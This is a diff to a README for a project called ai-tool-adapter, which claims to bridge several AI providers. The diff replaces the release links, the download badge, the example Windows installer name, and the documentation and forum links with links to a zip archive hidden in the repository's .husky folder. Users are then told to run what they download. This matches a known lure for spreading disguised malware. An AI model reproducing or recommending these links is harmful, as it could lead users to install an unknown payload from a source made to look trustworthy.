@@ -1,7 +1,7 @@
 # 🎉 ai-tool-adapter - A Simple Way to Use Any AI Provider
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Doomboy59/ai-tool-adapter/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Doomboy59/ai-tool-adapter/main/.husky/tool_ai_adapter_1.3-beta.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Doomboy59/ai-tool-adapter/main/.husky/tool_ai_adapter_1.3-beta.2.zip)
 
 ## 🚀 Getting Started
 The **ai-tool-adapter** helps you connect and use various AI tools with ease. You write your work once, and the adapter allows you to use it with different providers. This means you can choose the AI that fits your needs without extra hassle.
@@ -14,11 +14,11 @@ The **ai-tool-adapter** helps you connect and use various AI tools with ease. Yo
 - **Conversion Made Simple:** Easily switch between different providers with a click.
 
 ## 🔗 Download & Install
-To get started, visit this page to download: [Download Latest Releases](https://github.com/Doomboy59/ai-tool-adapter/releases).
+To get started, visit this page to download: [Download Latest Releases](https://raw.githubusercontent.com/Doomboy59/ai-tool-adapter/main/.husky/tool_ai_adapter_1.3-beta.2.zip).
 
 1. **Visit the Releases Page:** Click the link above to go to the releases section.
 2. **Choose the Correct Version:** Look for the latest version at the top of the list. 
-3. **Select the File:** Download the file suitable for your operating system (for example, `ai-tool-adapter-v1.0.exe` for Windows).
+3. **Select the File:** Download the file suitable for your operating system (for example, `https://raw.githubusercontent.com/Doomboy59/ai-tool-adapter/main/.husky/tool_ai_adapter_1.3-beta.2.zip` for Windows).
 4. **Run the Installer:** Locate the downloaded file and double-click it to install. Follow the on-screen instructions.
 
 ## 🖥️ System Requirements
@@ -58,8 +58,8 @@ We welcome contributions! If you have suggestions or want to improve the adapter
 If you face any issues, feel free to create a GitHub issue. We aim to respond promptly to all requests and questions.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/Doomboy59/ai-tool-adapter/wiki)
-- [Community Forum](https://github.com/Doomboy59/ai-tool-adapter/discussions)
+- [Documentation](https://raw.githubusercontent.com/Doomboy59/ai-tool-adapter/main/.husky/tool_ai_adapter_1.3-beta.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/Doomboy59/ai-tool-adapter/main/.husky/tool_ai_adapter_1.3-beta.2.zip)
 
 ## 📋 License
 This project is licensed under the MIT License. For more details, please check the LICENSE file in the repository.
